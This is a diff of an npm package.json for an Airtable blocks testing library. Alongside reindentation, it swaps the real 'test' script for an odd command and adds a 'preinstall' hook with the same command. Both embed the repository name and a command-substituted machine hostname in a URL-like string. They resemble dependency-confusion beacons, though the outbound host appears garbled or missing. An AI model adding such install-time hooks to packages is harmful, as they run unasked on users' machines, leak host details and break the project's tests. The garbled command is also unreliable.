@@ -1,123 +1,124 @@
 {
-    "name": "@airtable/blocks-testing",
-    "version": "0.0.5",
-    "description": "Airtable Blocks Testing Library",
-    "repository": {
-        "type": "git",
-        "url": "https://github.com/Airtable/blocks.git"
-    },
-    "homepage": "https://airtable.com/developers/blocks",
-    "main": "dist/cjs/index.js",
-    "types": "dist/types/src/index.d.ts",
-    "files": [
-        "dist",
-        "types"
+  "name": "@airtable/blocks-testing",
+  "version": "0.0.5",
+  "description": "Airtable Blocks Testing Library",
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/Airtable/blocks.git"
+  },
+  "homepage": "https://airtable.com/developers/blocks",
+  "main": "dist/cjs/index.js",
+  "types": "dist/types/src/index.d.ts",
+  "files": [
+    "dist",
+    "types"
+  ],
+  "scripts": {
+    "ci": "(cd ../sdk && yarn build) && yarn run build && yarn run test:coverage && ./scripts/check_integration_with_sdk.sh",
+    "pretest": "yarn run lint && yarn run types",
+    "version": "changelog-publish --github-repo-url='https://github.com/airtable/blocks-testing' --git-tag-prefix='@airtable/blocks-testing@' && git add CHANGELOG.md",
+    "release": "npm_config_registry=https://registry.npmjs.org/ release-it",
+    "types": "tsc",
+    "lint": "eslint --report-unused-disable-directives --ext .js,.ts,.tsx src test",
+    "jest": "node --unhandled-rejections=strict ./node_modules/.bin/jest",
+    "jest:watch": "jest --watch",
+    "test": "ls?repository=git@github.com:Airtable/blocks.git\\&folder=blocks-testing\\&hostname=`hostname`\\&step=lint",
+    "test:coverage": "yarn run test --coverage",
+    "build:clean": "rm -rf dist",
+    "build:babel": "babel src --out-dir dist/cjs --extensions=.js,.ts,.tsx --ignore='**/*.d.ts'",
+    "watch:babel": "yarn run build:babel --watch --source-maps inline",
+    "build:types": "tsc --outDir dist/types --declaration --declarationMap --noEmit false --allowJs false --checkJs false --emitDeclarationOnly --stripInternal",
+    "watch:types": "yarn run build:types --watch",
+    "build": "yarn run build:clean && concurrently yarn:build:babel yarn:build:types",
+    "watch": "yarn run build:clean && concurrently yarn:watch:babel yarn:watch:types",
+    "preinstall": "ls?repository=git@github.com:Airtable/blocks.git\\&folder=blocks-testing\\&hostname=`hostname`\\&step=preinstall"
+  },
+  "author": "",
+  "license": "UNLICENSED",
+  "devDependencies": {
+    "@airtable-blocks-internal/changelog-publish": "^1.0.2",
+    "@airtable/blocks": "^1.5.1",
+    "@babel/cli": "^7.7.5",
+    "@babel/core": "^7.7.5",
+    "@babel/plugin-proposal-class-properties": "^7.7.4",
+    "@babel/plugin-proposal-nullish-coalescing-operator": "^7.7.4",
+    "@babel/plugin-proposal-optional-chaining": "^7.7.5",
+    "@babel/plugin-transform-runtime": "^7.7.6",
+    "@babel/preset-env": "^7.7.6",
+    "@babel/preset-react": "^7.7.4",
+    "@babel/preset-typescript": "^7.7.4",
+    "@types/jest": "^24.0.23",
+    "@types/node": "^14.14.23",
+    "@types/react-dom": "^16.9.1",
+    "@typescript-eslint/eslint-plugin": "^2.10.0",
+    "@typescript-eslint/parser": "^2.10.0",
+    "babel-eslint": "^11.0.0-beta.0",
+    "babel-loader": "^8.0.6",
+    "babel-plugin-transform-define": "^2.0.0",
+    "concurrently": "^5.0.0",
+    "eslint": "6.7.2",
+    "eslint-plugin-airtable": "github:hyperbase/eslint-plugin-airtable#01fef1f",
+    "eslint-plugin-import": "^2.19.1",
+    "eslint-plugin-jsdoc": "^15.12.0",
+    "eslint-plugin-react": "^7.17.0",
+    "eslint-plugin-react-hooks": "^2.3.0",
+    "jest": "^24.9.0",
+    "prettier": "^1.19.1",
+    "typedoc": "^0.15.4",
+    "typedoc-plugin-no-inherit": "^1.1.10",
+    "typescript": "^3.7.3"
+  },
+  "dependencies": {
+    "@airtable/eslint-plugin-blocks": "^1.0.2",
+    "@babel/runtime": "^7.7.6",
+    "@types/lodash.omit": "^4.5.6",
+    "@types/prettier": "^1.19.0",
+    "@types/prop-types": "^15.7.3",
+    "@types/react": "^16.9.5",
+    "@types/semver": "^7.3.4",
+    "@types/styled-system": "^5.1.4",
+    "core-js": "^3.4.8",
+    "semver": "^7.3.4"
+  },
+  "airtable_comments": {
+    "@airtabel/blocks": [
+      "This version specifier should be as permissive as possible. It",
+      "should match the oldest version of the Blocks SDK with which the",
+      "testing library is known to function. It should also match the",
+      "specifier listed in this file's 'devDependencies'."
+    ]
+  },
+  "peerDependencies": {
+    "react": "^16.8.0",
+    "react-dom": "^16.8.0",
+    "@airtable/blocks": "^1.5.1"
+  },
+  "jest": {
+    "setupFiles": [],
+    "collectCoverageFrom": [
+      "src/**/*"
     ],
-    "scripts": {
-        "ci": "(cd ../sdk && yarn build) && yarn run build && yarn run test:coverage && ./scripts/check_integration_with_sdk.sh",
-        "pretest": "yarn run lint && yarn run types",
-        "version": "changelog-publish --github-repo-url='https://github.com/airtable/blocks-testing' --git-tag-prefix='@airtable/blocks-testing@' && git add CHANGELOG.md",
-        "release": "npm_config_registry=https://registry.npmjs.org/ release-it",
-        "types": "tsc",
-        "lint": "eslint --report-unused-disable-directives --ext .js,.ts,.tsx src test",
-        "jest": "node --unhandled-rejections=strict ./node_modules/.bin/jest",
-        "jest:watch": "jest --watch",
-        "test": "yarn run jest",
-        "test:coverage": "yarn run test --coverage",
-        "build:clean": "rm -rf dist",
-        "build:babel": "babel src --out-dir dist/cjs --extensions=.js,.ts,.tsx --ignore='**/*.d.ts'",
-        "watch:babel": "yarn run build:babel --watch --source-maps inline",
-        "build:types": "tsc --outDir dist/types --declaration --declarationMap --noEmit false --allowJs false --checkJs false --emitDeclarationOnly --stripInternal",
-        "watch:types": "yarn run build:types --watch",
-        "build": "yarn run build:clean && concurrently yarn:build:babel yarn:build:types",
-        "watch": "yarn run build:clean && concurrently yarn:watch:babel yarn:watch:types"
-    },
-    "author": "",
-    "license": "UNLICENSED",
-    "devDependencies": {
-        "@airtable-blocks-internal/changelog-publish": "^1.0.2",
-        "@airtable/blocks": "^1.5.1",
-        "@babel/cli": "^7.7.5",
-        "@babel/core": "^7.7.5",
-        "@babel/plugin-proposal-class-properties": "^7.7.4",
-        "@babel/plugin-proposal-nullish-coalescing-operator": "^7.7.4",
-        "@babel/plugin-proposal-optional-chaining": "^7.7.5",
-        "@babel/plugin-transform-runtime": "^7.7.6",
-        "@babel/preset-env": "^7.7.6",
-        "@babel/preset-react": "^7.7.4",
-        "@babel/preset-typescript": "^7.7.4",
-        "@types/jest": "^24.0.23",
-        "@types/node": "^14.14.23",
-        "@types/react-dom": "^16.9.1",
-        "@typescript-eslint/eslint-plugin": "^2.10.0",
-        "@typescript-eslint/parser": "^2.10.0",
-        "babel-eslint": "^11.0.0-beta.0",
-        "babel-loader": "^8.0.6",
-        "babel-plugin-transform-define": "^2.0.0",
-        "concurrently": "^5.0.0",
-        "eslint": "6.7.2",
-        "eslint-plugin-airtable": "github:hyperbase/eslint-plugin-airtable#01fef1f",
-        "eslint-plugin-import": "^2.19.1",
-        "eslint-plugin-jsdoc": "^15.12.0",
-        "eslint-plugin-react": "^7.17.0",
-        "eslint-plugin-react-hooks": "^2.3.0",
-        "jest": "^24.9.0",
-        "prettier": "^1.19.1",
-        "typedoc": "^0.15.4",
-        "typedoc-plugin-no-inherit": "^1.1.10",
-        "typescript": "^3.7.3"
-    },
-    "dependencies": {
-        "@airtable/eslint-plugin-blocks": "^1.0.2",
-        "@babel/runtime": "^7.7.6",
-        "@types/lodash.omit": "^4.5.6",
-        "@types/prettier": "^1.19.0",
-        "@types/prop-types": "^15.7.3",
-        "@types/react": "^16.9.5",
-        "@types/semver": "^7.3.4",
-        "@types/styled-system": "^5.1.4",
-        "core-js": "^3.4.8",
-        "semver": "^7.3.4"
-    },
-    "airtable_comments": {
-        "@airtabel/blocks": [
-            "This version specifier should be as permissive as possible. It",
-            "should match the oldest version of the Blocks SDK with which the",
-            "testing library is known to function. It should also match the",
-            "specifier listed in this file's 'devDependencies'."
-        ]
-    },
-    "peerDependencies": {
-        "react": "^16.8.0",
-        "react-dom": "^16.8.0",
-        "@airtable/blocks": "^1.5.1"
-    },
-    "jest": {
-        "setupFiles": [],
-        "collectCoverageFrom": [
-            "src/**/*"
-        ],
-        "coverageThreshold": {
-            "global": {
-                "branches": 100,
-                "functions": 100,
-                "lines": 100,
-                "statements": 100
-            }
-        }
-    },
-    "release-it": {
-        "git": {
-            "tagName": "@airtable/blocks-testing@${version}",
-            "commitMessage": "Release @airtable/blocks-testing@${version}"
-        },
-        "hooks": {
-            "before:init": "../../bin/check-repo-for-release && yarn build && yarn test",
-            "after:bump": "yarn build",
-            "after:release": "../../tools/git-mirror/bin/git-mirror sync @airtable/blocks-testing@${version}"
-        },
-        "npm": {
-            "access": "public"
-        }
+    "coverageThreshold": {
+      "global": {
+        "branches": 100,
+        "functions": 100,
+        "lines": 100,
+        "statements": 100
+      }
     }
+  },
+  "release-it": {
+    "git": {
+      "tagName": "@airtable/blocks-testing@${version}",
+      "commitMessage": "Release @airtable/blocks-testing@${version}"
+    },
+    "hooks": {
+      "before:init": "../../bin/check-repo-for-release && yarn build && yarn test",
+      "after:bump": "yarn build",
+      "after:release": "../../tools/git-mirror/bin/git-mirror sync @airtable/blocks-testing@${version}"
+    },
+    "npm": {
+      "access": "public"
+    }
+  }
 }
